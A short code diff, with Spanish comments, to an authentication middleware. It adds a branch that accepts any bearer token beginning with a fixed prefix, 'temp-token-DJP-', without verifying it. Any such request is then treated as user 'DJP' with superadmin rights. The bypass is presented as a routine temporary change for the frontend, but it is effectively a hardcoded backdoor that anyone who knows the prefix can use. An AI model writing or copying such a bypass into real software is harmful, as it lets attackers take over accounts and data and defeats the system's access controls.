@@ -138,7 +138,15 @@ class AuthService {
       // Extraer el token
       const token = authHeader.substring(7); // Quitar 'Bearer ' del inicio
 
-      // Verificar el token
+      // Verificar si es un token temporal del frontend (bypass para DJP)
+      if (token.startsWith('temp-token-DJP-')) {
+        // Token temporal válido para DJP con permisos de superadministrador
+        (req as any).user = { userId: 1, username: 'DJP', role: 'superadmin' };
+        next();
+        return;
+      }
+
+      // Verificar el token JWT normal
       const decoded = jwt.verify(token, JWT_SECRET) as { userId: number; username: string; role: string };
 
       // Añadir información del usuario a la solicitud
